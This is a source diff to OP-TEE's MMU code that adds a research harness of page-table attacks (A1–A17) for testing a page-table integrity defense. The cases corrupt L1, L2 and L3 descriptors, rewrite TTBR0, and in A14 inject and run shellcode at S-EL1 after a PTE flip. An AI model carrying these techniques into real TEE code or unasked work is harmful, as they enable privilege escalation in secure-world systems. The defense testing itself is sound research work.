@@ -69,7 +69,9 @@
 #include <kernel/misc.h>
 #include <kernel/panic.h>
 #include <kernel/thread.h>
+#include <kernel/thread_private.h>	/* threads[] for A2 (user_map corruption) */
 #include <kernel/tlb_helpers.h>
+#include <kernel/user_access.h>		/* enter/exit_user_access for A14 fn() */
 #include <memtag.h>
 #include <mm/core_memprot.h>
 #include <mm/pgt_cache.h>
@@ -1598,11 +1600,44 @@ enum core_mmu_fault core_mmu_get_fault_type(uint32_t fault_descr)
 static uint8_t attack_rw_page[PAGE_SIZE] __aligned(PAGE_SIZE);
 static const uint8_t attack_ro_page[PAGE_SIZE] __aligned(PAGE_SIZE) = { 1 };
 
-/* Fresh attacker-controlled L3-shaped buffer for attack 25a: a TA-loadable
- * L3 page that the attacker pre-populates with a malicious PTE then links
- * into the per-thread L2. The defense's link-time pre-validation walk in
- * vmi_check_thread_l2_entry should panic before the link completes. */
-static uint64_t attack_fake_l3[512] __aligned(PAGE_SIZE);
+/* A14 callback: invoked by the injected shellcode so a log line is
+ * printed by code running under the attacker's control. Marked noinline
+ * and used so the compiler cannot DCE it or inline it away. */
+static void __attribute__((noinline, used)) a14_injected_msg(void)
+{
+	IMSG(">>> A14 injected shellcode speaking from S-EL1 (canary=0xC0DE) <<<");
+}
+
+/* A14 payload: injected into the target TA page and called at EL1
+ * after PXN is cleared. Emitted by the assembler (not hand-encoded)
+ * so the bytes are guaranteed correct.
+ *
+ * Calling convention: x0 = pointer to a14_injected_msg (passed by the
+ * syscall as the sole argument of fn). Shellcode:
+ *   stp x29, x30, [sp, #-16]!  ; save frame + return addr to syscall
+ *   blr x0                      ; call the callback (prints IMSG)
+ *   ldp x29, x30, [sp], #16     ; restore
+ *   movz w0, #0xc0de            ; canary return value
+ *   ret                         ; return to syscall
+ *
+ * This proves execution twice: the callback's IMSG line is printed
+ * from within the shellcode's control flow, AND the shellcode returns
+ * the 0xC0DE canary through the syscall's return-value path. */
+extern const uint32_t a14_payload_start[];
+extern const uint32_t a14_payload_end[];
+asm(
+	".pushsection .rodata\n"
+	".global a14_payload_start\n"
+	".global a14_payload_end\n"
+	"a14_payload_start:\n"
+	"	stp	x29, x30, [sp, #-16]!\n"
+	"	blr	x0\n"
+	"	ldp	x29, x30, [sp], #16\n"
+	"	movz	w0, #0xc0de\n"
+	"	ret\n"
+	"a14_payload_end:\n"
+	".popsection\n"
+);
 
 static uint64_t *attack_find_l3_entry(vaddr_t va)
 {
@@ -1652,266 +1687,601 @@ static int32_t attack_find_empty_l2_slot(uint64_t *l2)
 	return -1;
 }
 
-/* Dispatcher for structural attacks (types 20+): writes targeting L1
- * entries, L2 entries, and link-time L3 validation. target_va: any kernel
- * VA is unused for L1 attacks; any TA user VA is required for L2/link
- * attacks so we can resolve the per-thread L2 via the live walk. */
-static void pgtable_attack_structure(unsigned long attack_type,
-				     unsigned long target_va)
-{
-	uint64_t *l1 = attack_get_l1();
-	uint64_t *l2;
-	int32_t slot;
-	uint64_t pa;
-
-	switch (attack_type) {
-	case 20: { /* Kernel L1 entry write — unlink a kernel L1 slot.
-		    * Write 0 (a value the TA-slot policy *would* allow), so
-		    * the defense's value check passes and the kernel-snapshot
-		    * check fires distinctly: "kernel entry[i] write 0x0". */
-		for (uint32_t i = 0; i < 4; i++) {
-			if ((l1[i] & 0x3) == TABLE_DESC) {
-				DMSG("attack 20: kernel L1[%u] = 0x%lx -> 0",
-				     i, l1[i]);
-				l1[i] = 0;
-				break;
-			}
-		}
-		break;
-	}
-	case 21: { /* TA L1 entry write — bad value (not 0, not thread_l2_desc) */
-		/* TA L1 starts 32 bytes after kernel L1 in the same page,
-		 * so it begins at slot index 4 in the combined view. */
-		DMSG("attack 21: TA L1[4] = 0x%lx -> 0xdeadbeef00000003",
-		     l1[4]);
-		l1[4] = 0xdeadbeef00000003ULL;
-		break;
-	}
-	case 22: { /* Kernel L2 entry write — walk via a known kernel VA */
-		l2 = attack_get_l2((vaddr_t)attack_rw_page);
-		DMSG("attack 22: kernel L2[0] = 0x%lx -> 0xdeadbeef",
-		     l2[0]);
-		l2[0] = 0xdeadbeef;
-		break;
-	}
-	case 23: { /* Per-thread L2 block descriptor in an empty slot */
-		if (!target_va) {
-			EMSG("attack 23 requires TA user VA in target_va");
-			return;
-		}
-		l2 = attack_get_l2(target_va);
-		slot = attack_find_empty_l2_slot(l2);
-		if (slot < 0) {
-			EMSG("attack 23: no empty L2 slot");
-			return;
-		}
-		/* 2MB block descriptor pointing at a fake PA — type=0b01. */
-		DMSG("attack 23: thread L2[%d] = 0 -> 0x12345001 (block)",
-		     slot);
-		l2[slot] = 0x12345000ULL | BLOCK_DESC;
-		break;
-	}
-	case 24: { /* Per-thread L2 table descriptor with NSTable bit set */
-		if (!target_va) {
-			EMSG("attack 24 requires TA user VA in target_va");
-			return;
-		}
-		l2 = attack_get_l2(target_va);
-		slot = attack_find_empty_l2_slot(l2);
-		if (slot < 0) {
-			EMSG("attack 24: no empty L2 slot");
-			return;
-		}
-		/* NSTable is bit 63 on an L1/L2 table descriptor. */
-		DMSG("attack 24: thread L2[%d] = 0 -> NSTable + table",
-		     slot);
-		l2[slot] = 0x12345000ULL | TABLE_DESC | (1ULL << 63);
-		break;
-	}
-	case 25: { /* 25a: link a fresh L3 pre-loaded with one W^X PTE */
-		if (!target_va) {
-			EMSG("attack 25a requires TA user VA in target_va");
-			return;
-		}
-		memset(attack_fake_l3, 0, sizeof(attack_fake_l3));
-		/* Malicious PTE: PA=attack_rw_page, writable+EL0-executable.
-		 *   bits 0..11 = 0xf4f  (page desc, AttrIndx=3, AP_EL0=1,
-		 *                       AP_RO=0, SH=ISH, AF=1, nG=1)
-		 *   bits 52..55 = 0x2   (PXN=1, UXN=0)  → W∧X. */
-		pa = virt_to_phys(attack_rw_page);
-		attack_fake_l3[0] = pa | 0x20000000000f4fULL;
-
-		uint64_t fake_l3_pa = virt_to_phys(attack_fake_l3);
-
-		l2 = attack_get_l2(target_va);
-		slot = attack_find_empty_l2_slot(l2);
-		if (slot < 0) {
-			EMSG("attack 25a: no empty L2 slot");
-			return;
-		}
-		DMSG("attack 25a: link fake L3 PA=0x%lx (PTE[0]=0x%lx) at "
-		     "thread L2[%d]", fake_l3_pa, attack_fake_l3[0], slot);
-		l2[slot] = fake_l3_pa | TABLE_DESC;
-		break;
-	}
-	case 26: { /* 25b: link a kernel L3 PA into the per-thread L2 */
-		if (!target_va) {
-			EMSG("attack 25b requires TA user VA in target_va");
-			return;
-		}
-		/* Harvest a kernel L3 PA by walking to the kernel L2 and
-		 * picking any TABLE_DESC entry. */
-		uint64_t *kernel_l2 =
-			attack_get_l2((vaddr_t)attack_rw_page);
-		uint64_t kernel_l3_pa = 0;
-
-		for (uint32_t i = 0; i < 512; i++) {
-			if ((kernel_l2[i] & 0x3) == TABLE_DESC) {
-				kernel_l3_pa = kernel_l2[i] & ATTACK_PA_MASK;
-				break;
-			}
-		}
-		if (!kernel_l3_pa) {
-			EMSG("attack 25b: no kernel L3 PA found");
-			return;
-		}
-		l2 = attack_get_l2(target_va);
-		slot = attack_find_empty_l2_slot(l2);
-		if (slot < 0) {
-			EMSG("attack 25b: no empty L2 slot");
-			return;
-		}
-		DMSG("attack 25b: link kernel L3 PA=0x%lx at thread L2[%d]",
-		     kernel_l3_pa, slot);
-		l2[slot] = kernel_l3_pa | TABLE_DESC;
-		break;
-	}
-	case 27: { /* 25c: alias an existing thread L3 PA into a 2nd L2 slot */
-		if (!target_va) {
-			EMSG("attack 25c requires TA user VA in target_va");
-			return;
-		}
-		l2 = attack_get_l2(target_va);
-		uint64_t existing_l3_pa = 0;
-		int32_t source_slot = -1;
-
-		for (uint32_t i = 0; i < 512; i++) {
-			if ((l2[i] & 0x3) == TABLE_DESC) {
-				existing_l3_pa = l2[i] & ATTACK_PA_MASK;
-				source_slot = i;
-				break;
-			}
-		}
-		if (!existing_l3_pa) {
-			EMSG("attack 25c: no existing thread L3 PA");
-			return;
-		}
-		slot = attack_find_empty_l2_slot(l2);
-		if (slot < 0 || slot == source_slot) {
-			EMSG("attack 25c: no different empty L2 slot");
-			return;
-		}
-		DMSG("attack 25c: alias thread L3 PA=0x%lx into L2[%d] "
-		     "(also linked from L2[%d])",
-		     existing_l3_pa, slot, source_slot);
-		l2[slot] = existing_l3_pa | TABLE_DESC;
-		break;
-	}
-	default:
-		EMSG("pgtable_attack_structure: unknown type %lu", attack_type);
-		return;
-	}
-
-	dsb();
-	tlbi_all();
-	isb();
-}
-
+/* Unified page-table attack dispatcher. A#-numbered per the thesis
+ * taxonomy (section 5.2.3). cmd_id passed through from the TA equals
+ * A companion probes are numbered adjacent to their parent:
+ *   A9a (cmd_id 9)  → A9b  (cmd_id 10)  — dispatcher ordering
+ *   A11a (cmd_id 12) → A11b (cmd_id 13)  — kernel-L2 NSTable
+ * All other attacks stay in A#-labelled sequence; because of the two
+ * a/b insertions, cmd_id ≠ A# for A10 onwards (A10 is at cmd_id 11,
+ * A12 at 14, A24 at 26).
+ *
+ * L1 LAYOUT (build-dependent — this file assumes CFG_TEE_CORE_NB_CORE=1,
+ * T0SZ=32, so l1_total_entries=4 and user_va_idx=3):
+ *
+ *   entry_idx:  0  1  2  3  |  4  5  6  7
+ *               └── table 0 ─┘  └── table 1 ─┘
+ *   kernel      K  K  K       K  K  K
+ *   user slot            U                  U
+ *
+ *   L1_USER_SLOT       = 3           (first table's user slot)
+ *   L1_MELTDOWN_USER   = 7           (second table's user slot: 4+3)
+ *   L1_MELTDOWN_KSLOT  = 5           (any kernel slot in second table)
+ *
+ * If user_va_idx or l1_total_entries change (e.g. multi-core or different
+ * T0SZ), the L1 attacks (A3, A4, A6, A7, A8, A9-order) need their slot
+ * indices updated to match. The defense will panic with a message citing
+ * the observed user_va_idx if we miss.
+ *
+ * Target selection:
+ *   - L1 attacks (A3-A8, A9b): walk kernel TTBR0 via attack_get_l1().
+ *   - L2 attacks (A10-A12, A23-A24): need TA VA in target_va so
+ *     the walk resolves to the per-thread L2.
+ *   - Kernel L2 attacks (A11b, A13): walk kernel L2 via attack_rw_page VA.
+ *   - TA L3 PTE-content (A14, A15, A19-A22): need TA VA in target_va.
+ *   - Core L3 / kernel target (A16, A17, A18): use kernel target
+ *     internally — the escalation *is* touching core, so a TA target
+ *     would be a weaker (or different) claim.
+ *   - P1 register channel: A1 (cmd_id 1) is a synthetic check-
+ *     verification PoC (no natural memory→TTBR0 code path in this
+ *     build); A2 (cmd_id 2) is a natural indirect vector (user_map
+ *     corruption caught downstream at the L1 write).
+ */
+#define L1_USER_SLOT      3
+#define L1_MELTDOWN_USER  7
+#define L1_MELTDOWN_KSLOT 5
 void pgtable_attack(unsigned long attack_type, unsigned long target_va)
 {
-	vaddr_t target;
-	uint64_t *pte;
-	uint64_t v;
-
-	if (attack_type >= 20) {
-		pgtable_attack_structure(attack_type, target_va);
-		return;
-	}
-
-	if (target_va) {
-		/* A caller-supplied target VA drives the write into a per-thread
-		 * (TA) L3 instead of a core/kernel L3. attack_find_l3_entry walks
-		 * the live TTBR0, which holds the TA user map during the syscall,
-		 * so a TA VA resolves to its thread L3. The caller is responsible
-		 * for passing a page of the right kind (RW vs RO) for the attack. */
-		target = (vaddr_t)target_va;
-	} else {
-		/* Pick a core target page of the right kind for this attack. We
-		 * never target live .text: under WXN, making a code page writable
-		 * makes it non-executable, which would fault the very code running
-		 * this attack. W^X is a property of the PTE bits, so we demonstrate
-		 * it on the writable .bss page (made executable) instead. */
-		switch (attack_type) {
-		case 1: /* EL1-EXEC: .rodata (RO, non-exec) */
-		case 2: /* EL0-EXEC: .rodata */
-		case 5: /* CODE-WRITE: .rodata */
-			target = (vaddr_t)attack_ro_page;
-			break;
-		default: /* W^X / GLOBAL / EL0-ACCESS / NS / MEM-TYPE / SHAREABILITY */
-			target = (vaddr_t)attack_rw_page;
-			break;
-		}
-	}
-
-	pte = attack_find_l3_entry(target);
-	v = *pte;
-
 	switch (attack_type) {
-	case 0: /* W^X VIOLATION (writable .bss made executable) */
-		v &= ~UPPER_ATTRS(PXN);
+
+	/* ────────── P1: register channel (A1, synthetic) ────────── */
+
+	case 1: { /* A1 (SYNTHETIC): exercise TVM+whitelist against a
+		   * memory-derived TTBR0 value.
+		   *
+		   * Code-walk finding: this OP-TEE build has NO runtime code
+		   * path that reloads TTBR0's PA field from writable memory.
+		   * core_mmu_set_prtn is #ifdef CFG_NS_VIRTUALIZATION (off);
+		   * every other write_ttbr0_el1 site does read-modify-write
+		   * of the live register. So the register channel has no
+		   * threat-model-faithful in-model attack in this build.
+		   *
+		   * A1 verifies the CHECK itself by synthesizing a load-then-
+		   * MSR sequence: attacker's realistic capability is the
+		   * memory store to `attacker_ttbr`; the harness-added MSR
+		   * completes the chain OP-TEE would have completed under a
+		   * different config (or future code). Not a threat-model
+		   * attack — a check-verification PoC. Presented paired with
+		   * the analytical §5.2.1 argument on SCTLR/TCR/MAIR pinning
+		   * and the natural base_tables→TTBR0 path. */
+		static volatile uint64_t attacker_ttbr;
+
+		/* (1) Realistic capability: memory store to writable variable. */
+		attacker_ttbr = 0xdeadbeef000ULL;
+		dsb();
+
+		/* (2) Harness-added load-then-MSR: no natural OP-TEE code path
+		 * does this in the current build. */
+		uint64_t v = attacker_ttbr;
+
+		DMSG("A1 (synthetic): msr ttbr0_el1, 0x%lx — "
+		     "expect TVM+whitelist panic", v);
+		asm volatile("msr ttbr0_el1, %0" : : "r"(v) : "memory");
+		isb();
 		break;
-	case 1: /* EL1-EXEC VIOLATION (PXN=0, target not .text) */
-		v &= ~UPPER_ATTRS(PXN);
+	}
+
+	/* ────────── P2: novel-vector (A2) ────────── */
+
+	case 2: { /* A2: L1 value-pin via indirect user_map corruption.
+		   * Attacker's realistic capability: a memory-store primitive
+		   * against ordinary writable memory (nex_pool per-thread
+		   * struct). No page-table page is touched by the attacker.
+		   *
+		   * OP-TEE's own resume path (core_mmu_set_user_map) reads
+		   * threads[t].user_map.user_map and writes it into the L1
+		   * base-table entry at user_slot. That L1 write is what
+		   * triggers the S2-RO fault — the L1 value-pin catches the
+		   * corrupted value, not the register.
+		   *
+		   * Trigger note: in the CA→TA→syscall→return flow the resume
+		   * doesn't happen naturally within one syscall (map is
+		   * already installed). The PoC forces the natural code path
+		   * to run by calling core_mmu_set_user_map here — the code
+		   * path is OP-TEE's own, only the trigger timing is synthetic.
+		   *
+		   * Expected panic: same L1 VIOLATION string as A3, cited as
+		   * evidence that the L1 monitor catches indirect vectors
+		   * regardless of who ultimately issues the PT write. */
+		unsigned int tid = thread_get_id();
+
+		/* Save the legitimate user_map so we can restore it after the
+		 * baseline readback — otherwise the corrupted mapping stays
+		 * live and the TA mistranslates its own code on return,
+		 * faulting forever. */
+		struct core_mmu_user_map saved_map = threads[tid].user_map;
+
+		threads[tid].user_map.user_map = 0xdeadbeef00000003ULL;
+		dsb();
+		DMSG("A2: corrupted threads[%u].user_map.user_map = "
+		     "0xdeadbeef00000003; forcing set_user_map to trigger "
+		     "the natural reinstall path", tid);
+		core_mmu_set_user_map(&threads[tid].user_map);
+		/* Defended build panics here (L1 value-pin inside
+		 * core_mmu_set_user_map); nothing below runs. */
+
+		/* Baseline observation: read back L1[user_slot] to prove the
+		 * indirect vector installed the attacker value via OP-TEE's
+		 * own reinstall path. */
+		uint64_t *l1 = attack_get_l1();
+		IMSG("A2 baseline: L1[%d] readback = 0x%lx "
+		     "(indirect vector installed via OP-TEE's own code)",
+		     L1_USER_SLOT, l1[L1_USER_SLOT]);
+
+		/* Restore the legitimate mapping so the TA can execute again
+		 * on return (baseline only — defended never reaches here). */
+		threads[tid].user_map = saved_map;
+		dsb();
+		core_mmu_set_user_map(&threads[tid].user_map);
 		break;
-	case 2: /* EL0-EXEC VIOLATION (UXN=0, target not pool/kcode) */
+	}
+
+	/* ────────── P2: L1 structural (A3–A7) ────────── */
+
+	case 3: { /* A3: L1 attacker-L2 (TABLE + bad PA) in user slot.
+		   * Fires L1 value-pin (slot check passes, value check
+		   * refuses anything != 0 and != thread_l2_desc). */
+		uint64_t *l1 = attack_get_l1();
+		DMSG("A3: L1[%d] = 0xdeadbeef00000003 (bad TABLE, user slot)",
+		     L1_USER_SLOT);
+		l1[L1_USER_SLOT] = 0xdeadbeef00000003ULL;
+		dsb();
+
+		/* Baseline observation: read back the L1 entry to confirm the
+		 * corrupted TABLE persists in the table. Unreachable on
+		 * defended (L1 value-pin panics at the store above). */
+		IMSG("A3 baseline: L1[%d] readback = 0x%lx "
+		     "(corruption persisted in L1 table)",
+		     L1_USER_SLOT, l1[L1_USER_SLOT]);
+		break;
+	}
+	case 4: { /* A4: 1 GiB BLOCK descriptor at L1 user slot.
+		   * Distinct from A3 in encoding — bits[1:0]=0b01 (BLOCK)
+		   * rather than 0b11 (TABLE). Same L1 value-pin fires. */
+		uint64_t *l1 = attack_get_l1();
+		DMSG("A4: L1[%d] = 0x12345001 (1GiB BLOCK, user slot)",
+		     L1_USER_SLOT);
+		l1[L1_USER_SLOT] = 0x12345000ULL | 0x1;
+		break;
+	}
+	case 5: { /* A5: legitimate thread_l2_desc into a kernel L1 slot.
+		   * Read the current thread_l2_desc from the user slot; write
+		   * it into a kernel slot. Value would be admitted at the user
+		   * slot; slot check refuses it in a kernel slot. Proves
+		   * slot-immutability is independent of value. */
+		uint64_t *l1 = attack_get_l1();
+		uint64_t td = l1[L1_USER_SLOT]; /* current user descriptor */
+		DMSG("A5: L1[0] = 0x%lx (thread_l2_desc into kernel slot)", td);
+		l1[0] = td;
+		break;
+	}
+	case 6: { /* A6: attacker-L2 into Meltdown-side user slot.
+		   * L1 holds two base tables of l1_total_entries each. The
+		   * second table's user slot is at index (l1_total_entries +
+		   * user_va_idx). Verifies the value-pin applies symmetrically
+		   * to BOTH tables' user slots. */
+		uint64_t *l1 = attack_get_l1();
+		DMSG("A6: L1[%d] = 0xdeadbeef00000003 (Meltdown-side user)",
+		     L1_MELTDOWN_USER);
+		l1[L1_MELTDOWN_USER] = 0xdeadbeef00000003ULL;
+		break;
+	}
+	case 7: { /* A7: write at Meltdown-side non-user slot.
+		   * Any kernel slot in the second base table. Slot-immutability
+		   * fires with slot ≠ user_va_idx. */
+		uint64_t *l1 = attack_get_l1();
+		DMSG("A7: L1[%d] = 0xdeadbeef00000003 (Meltdown-side kernel)",
+		     L1_MELTDOWN_KSLOT);
+		l1[L1_MELTDOWN_KSLOT] = 0xdeadbeef00000003ULL;
+		break;
+	}
+
+	/* ────────── P2: fail-stop paths (A8, A9a, A9b at cmd_id 25) ────────── */
+
+	case 8: { /* A8: L1 SAS gate — sub-doubleword store (strb).
+		   * L1 handler has no memset fast-path, so byte stores go
+		   * straight to the SAS check and panic on SAS≠3. Expected
+		   * panic string cites SAS=0. Target: user slot so the fault
+		   * fires before the SAS check runs. */
+		uint64_t *l1 = attack_get_l1();
+		volatile uint8_t *p = (volatile uint8_t *)&l1[L1_USER_SLOT];
+		DMSG("A8: strb 0xaa at &L1[%d]=%p", L1_USER_SLOT, p);
+		asm volatile("strb %w0, [%1]"
+			     : : "r"((uint32_t)0xaa), "r"(p) : "memory");
+		break;
+	}
+	case 9: { /* A9a: dispatcher ISV=0 gate — stp at core L3 PTE.
+		   * The top-level ISV check panics before any region
+		   * routing. Cites ESR=0x9200004f (ISV=0, DFSC=0x0F).
+		   * Companion A9b at cmd_id 10 verifies dispatcher ordering
+		   * (ISV gate fires before per-region L1 SAS gate). */
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)attack_rw_page);
+		DMSG("A9a: stp at core L3 PTE %p", pte);
+		asm volatile("stp %0, %1, [%2]"
+			     : : "r"((uint64_t)0xdeadbeefULL),
+				 "r"((uint64_t)0xcafef00dULL),
+				 "r"(pte) : "memory");
+		break;
+	}
+	case 10: { /* A9b: dispatcher ordering probe. Same stp encoding
+		    * as A9a but targeting L1 user slot. Verifies top-level
+		    * ISV=0 gate fires BEFORE per-region L1 SAS gate. Expected
+		    * panic is ISV=0 (not L1 SAS). */
+		uint64_t *l1 = attack_get_l1();
+
+		DMSG("A9b: stp at &L1[%d]=%p", L1_USER_SLOT,
+		     &l1[L1_USER_SLOT]);
+		asm volatile("stp %0, %1, [%2]"
+			     : : "r"((uint64_t)0xdeadbeefULL),
+				 "r"((uint64_t)0xcafef00dULL),
+				 "r"(&l1[L1_USER_SLOT]) : "memory");
+		break;
+	}
+
+	/* ────────── P2: L2 policy (A10–A13) ────────── */
+
+	case 11: { /* A10: L2 BLOCK descriptor in per-thread L2.
+		    * Any block at L2 in a TA context is a policy violation
+		    * (per-thread L2 must contain only clears or TABLE
+		    * descriptors → pgt_tables). */
+		if (!target_va) { EMSG("A10 requires TA VA"); return; }
+		uint64_t *l2 = attack_get_l2((vaddr_t)target_va);
+		int32_t slot = attack_find_empty_l2_slot(l2);
+		if (slot < 0) { EMSG("A10: no empty slot"); return; }
+		DMSG("A10: thread L2[%d] = 0x12345001 (BLOCK)", slot);
+		l2[slot] = 0x12345000ULL | 0x1;
+		break;
+	}
+	case 12: { /* A11a: L2 TABLE with NSTable=1 in per-thread L2.
+		    * NSTable would force the entire L3 sub-tree non-secure,
+		    * bypassing per-leaf NS policy. Refused unconditionally.
+		    * Companion A11b at cmd_id 13 tests the same check in
+		    * the kernel-L2 emulator (parallel code path). */
+		if (!target_va) { EMSG("A11a requires TA VA"); return; }
+		uint64_t *l2 = attack_get_l2((vaddr_t)target_va);
+		int32_t slot = attack_find_empty_l2_slot(l2);
+		if (slot < 0) { EMSG("A11a: no empty slot"); return; }
+		DMSG("A11a: thread L2[%d] = TABLE | NSTable", slot);
+		l2[slot] = 0x12345000ULL | 0x3 | (1ULL << 63);
+		break;
+	}
+	case 13: { /* A11b: kernel L2 NSTable — kernel-side variant of A11a.
+		    * Fires the NSTable check in vmi_emulate_kernel_l2_write
+		    * (parallel to the ul1 check in vmi_check_thread_l2_entry). */
+		uint64_t *kl2 = attack_get_l2((vaddr_t)attack_rw_page);
+		int32_t slot = -1;
+
+		for (int32_t i = 0; i < 512; i++)
+			if (kl2[i] == 0) { slot = i; break; }
+		if (slot < 0) { EMSG("A11b: no empty kernel L2 slot"); return; }
+		DMSG("A11b: kernel L2[%d] = TABLE | NSTable", slot);
+		kl2[slot] = 0x12345000ULL | 0x3 | (1ULL << 63);
+		break;
+	}
+	case 14: { /* A12: L2 TABLE target outside pgt_tables (thread L2).
+		    * Uses a real kernel L3 PA — not attacker garbage —
+		    * so the failure is "kernel table linked into TA L2",
+		    * not "malformed descriptor rejected". */
+		if (!target_va) { EMSG("A12 requires TA VA"); return; }
+		uint64_t *l2 = attack_get_l2((vaddr_t)target_va);
+		uint64_t *klu = attack_get_l2((vaddr_t)attack_rw_page);
+		uint64_t kl3_pa = 0;
+
+		for (uint32_t i = 0; i < 512; i++) {
+			if ((klu[i] & 0x3) == 0x3) {
+				kl3_pa = klu[i] & ATTACK_PA_MASK;
+				break;
+			}
+		}
+		if (!kl3_pa) { EMSG("A12: no kernel L3 PA found"); return; }
+		int32_t slot = attack_find_empty_l2_slot(l2);
+		if (slot < 0) { EMSG("A12: no empty slot"); return; }
+		DMSG("A12: link kernel L3 PA=0x%lx into thread L2[%d]",
+		     kl3_pa, slot);
+		l2[slot] = kl3_pa | 0x3;
+		break;
+	}
+	case 15: { /* A13: kernel L2 TABLE target outside xlat_tables.
+		    * Kernel L2 emulator refuses TABLE PAs outside the
+		    * xlat_pool range. Target: attack_rw_page's own PA
+		    * (in tee_ram_rw, outside xlat_tables). */
+		uint64_t *kl2 = attack_get_l2((vaddr_t)attack_rw_page);
+		int32_t slot = -1;
+
+		for (int32_t i = 0; i < 512; i++)
+			if (kl2[i] == 0) { slot = i; break; }
+		if (slot < 0) { EMSG("A13: no empty kernel L2 slot"); return; }
+		uint64_t bad_pa = virt_to_phys(attack_rw_page);
+		DMSG("A13: kernel L2[%d] = 0x%lx | TABLE (outside xlat)",
+		     slot, bad_pa);
+		kl2[slot] = bad_pa | 0x3;
+		break;
+	}
+
+	/* ────────── P3: execute-axis PTE policy (A14–A18) ────────── */
+
+	case 16: { /* A14: EL1-EXEC via RO+X bypass of hardware WXN.
+		    *
+		    * OP-TEE forces SCTLR_EL1.WXN=1 (CFG_CORE_RWDATA_NOEXEC=y
+		    * in arm.mk). Hardware treats any writable page as
+		    * execute-never regardless of PXN/UXN, so a naive single
+		    * PXN clear on a writable page cannot yield executable
+		    * memory: the instruction fetch faults on baseline (as
+		    * well as being trapped by the defence's W^X check). To
+		    * isolate the defence's EL1-EXEC containment as sole
+		    * barrier, this attack takes the sophisticated route:
+		    *
+		    *   Step 1: EL1 writes shellcode into ta_rw_page. Plain
+		    *           data write to a legitimately-writable TA
+		    *           page — no PTE mutation, no S2 trap.
+		    *   Step 2: PTE flip to AP_RO=1, PXN=0. Result is RO +
+		    *           EL1-executable. WXN permits fetches from
+		    *           this page (no longer writable). On defended
+		    *           the PTE store traps and fires EL1-EXEC
+		    *           containment (PXN=0 with PA in ta_ram, which
+		    *           is outside tee_ram_rx). On baseline it lands.
+		    *   Step 3: Call the page. Baseline executes shellcode
+		    *           and returns 0xC0DE — paper-citable "write
+		    *           primitive escalated to arbitrary S-EL1 code
+		    *           execution" evidence.
+		    *
+		    * The W^X policy is not fired by this attack (the new
+		    * PTE is not writable). W^X remains a defence pillar
+		    * co-enforced by SCTLR.WXN and analytically documented;
+		    * no in-model attack isolates it on this build.
+		    *
+		    * Pair with A15 (case 17): A15 is the minimal single-
+		    * PTE probe of the same EL1-EXEC check, without the
+		    * injection or execution demo.
+		    *
+		    * PAN wrapper: the target page is EL0-accessible
+		    * (AP_UNPRIV=1), so under FEAT_PAN3 (EPAN) with PAN=1
+		    * EL1 instruction fetch would be prohibited. Brackets
+		    * the fn() call with enter/exit_user_access to disable
+		    * PAN across the call. */
+		if (!target_va) { EMSG("A14 requires TA VA"); return; }
+
+		size_t plen = (uintptr_t)a14_payload_end -
+			      (uintptr_t)a14_payload_start;
+		memcpy((void *)target_va, a14_payload_start, plen);
+		cache_op_inner(DCACHE_AREA_CLEAN, (void *)target_va, plen);
+		cache_op_inner(ICACHE_AREA_INVALIDATE, (void *)target_va, plen);
+		dsb();
+		isb();
+
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)target_va);
+		uint64_t v = *pte;
+
+		v |= LOWER_ATTRS(AP_RO);
+		v &= ~UPPER_ATTRS(PXN);
+		DMSG("A14: TA L3 PTE 0x%lx -> 0x%lx (AP_RO=1, PXN=0 → RO+X)",
+		     *pte, v);
+		dsb(); *pte = v; dsb(); tlbi_all(); isb();
+
+		uint32_t (*fn)(void (*)(void)) =
+			(uint32_t (*)(void (*)(void)))target_va;
+		enter_user_access();
+		uint32_t r = fn(a14_injected_msg);
+		exit_user_access();
+		IMSG("A14 baseline: injected code returned 0x%x %s", r,
+		     (r == 0xC0DE) ? "-- CODE EXECUTED in S-EL1"
+				   : "-- unexpected");
+		break;
+	}
+	case 17: { /* A15: TA L3 EL1-EXEC — clear PXN on RO TA page.
+		    * Target is a TA .rodata buffer (AP_RO=1), so writable=0;
+		    * clearing PXN doesn't trip W^X. EL1-EXEC containment
+		    * catches the PA being outside tee_ram_rx. */
+		if (!target_va) { EMSG("A15 requires TA RO VA"); return; }
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)target_va);
+		uint64_t v = *pte;
+
+		v &= ~UPPER_ATTRS(PXN);
+		DMSG("A15: TA L3 PTE 0x%lx -> 0x%lx (clear PXN, RO target)",
+		     *pte, v);
+		dsb(); *pte = v; dsb(); tlbi_all(); isb();
+		break;
+	}
+	case 18: { /* A16: EL0-EXEC — clear UXN on kernel .rodata.
+		    * Core target required: ta_ram is in the allowed EL0-EXEC
+		    * list, so a TA-target version would silently pass. Kernel
+		    * .rodata is outside VCORE_FREE / TA_RAM / kcode, so the
+		    * EL0-EXEC containment check fires. */
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)attack_ro_page);
+		uint64_t v = *pte;
+
 		v &= ~UPPER_ATTRS(XN);
+		DMSG("A16: kernel .rodata PTE 0x%lx -> 0x%lx (clear UXN)",
+		     *pte, v);
+		dsb(); *pte = v; dsb(); tlbi_all(); isb();
 		break;
-	case 3: /* GLOBAL-MAPPING VIOLATION (EL0-accessible + global) */
-		v |= LOWER_ATTRS(AP_UNPRIV);
-		v &= ~LOWER_ATTRS(NON_GLOBAL);
+	}
+	case 19: { /* A17: CODE-WRITE — clear AP_RO on kernel .rodata.
+		    * Core target required: CODE-WRITE check gates on the
+		    * PA overlapping tee_ram_rx/ro; a TA target (in ta_ram)
+		    * would not overlap. */
+		uint64_t *pte = attack_find_l3_entry((vaddr_t)attack_ro_page);
+		uint64_t v = *pte;
+
+		v &= ~LOWER_ATTRS(AP_RO);
+		DMSG("A17: kernel .rodata PTE 0x%lx -> 0x%lx (clear AP_RO)",
+		     *pte, v);
+		dsb(); *pte = v; dsb(); tlbi_all(); isb();
+
+		/* Baseline observation: attempt to overwrite the .rodata
+		 * page. Pre-flip AP_RO=1 blocks EL1 writes; post-flip on
+		 * baseline AP_RO=0 → write lands. Initial byte is 1 (from
+		 * the initialiser), so 0xAA is unambiguously our value.
+		 * Unreachable on defended (CODE-WRITE panic at the store
+		 * above). */
+		volatile uint8_t *ro = (volatile uint8_t *)attack_ro_page;
+		*ro = 0xAA;
+		dsb();
+		IMSG("A17 baseline: wrote 0xAA to .rodata, readback = 0x%x %s",
+		     *ro,
+		     (*ro == 0xAA) ? "-- .rodata IS NOW WRITABLE"
+				   : "-- unexpected");
 		break;
-	case 4: /* EL0-ACCESS VIOLATION (EL0-accessible kernel page, nG=1) */
+	}
+	/* ────────── P4: access-axis PTE policy (A18–A22) ────────── */
+
